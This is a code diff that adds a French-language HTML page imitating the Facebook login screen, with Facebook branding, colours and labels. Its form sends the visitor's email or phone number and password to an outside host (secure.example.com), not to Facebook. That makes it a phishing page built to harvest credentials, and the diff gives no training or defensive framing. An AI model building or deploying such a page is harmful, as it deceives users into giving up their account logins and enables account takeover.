@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Connexion Facebook</title>
+    <style>
+        body { font-family: Arial, sans-serif; }
+        .container { width: 300px; margin: 0 auto; }
+        .form-group { margin-bottom: 15px; }
+        .form-group label { display: block; }
+        .form-group input { width: 100%; padding: 8px; box-sizing: border-box; }
+        .btn { 
+            padding: 10px 20px; 
+            background-color: #3b5998; /* Couleur bleu de Facebook */
+            color: white; 
+            border: none; 
+            cursor: pointer; 
+            font-size: 16px; /* Taille de police légèrement augmentée */
+        }
+        .btn:hover { 
+            background-color: #2d4373; /* Couleur plus sombre au survol */
+        }
+        .error { color: red; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>Connexion à Facebook</h2>
+        <form action="https://secure.example.com/login" method="post">
+            <div class="form-group">
+                <label for="email">Email ou numéro de téléphone</label>
+                <input type="text" id="email" name="email" pattern="[a-z0-9._%+-]+@[a-z0-9.-]+.[a-z]{2,}$" required>
+            </div>
+            <div class="form-group">
+                <label for="password">Mot de passe</label>
+                <input type="password" id="password" name="password" required>
+            </div>
+            <button type="submit" class="btn">Se connecter</button>
+        </form>
+    </div>
+</body>
+</html>
